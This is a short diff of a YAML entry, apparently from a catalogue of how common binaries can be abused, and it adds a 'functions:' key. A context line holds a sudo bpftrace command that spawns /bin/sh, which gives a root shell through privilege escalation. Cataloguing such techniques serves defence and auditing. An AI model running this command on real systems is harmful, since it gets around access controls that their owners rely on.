@@ -1,3 +1,4 @@
+functions:
   sudo:
     - code: sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'
     - code: |
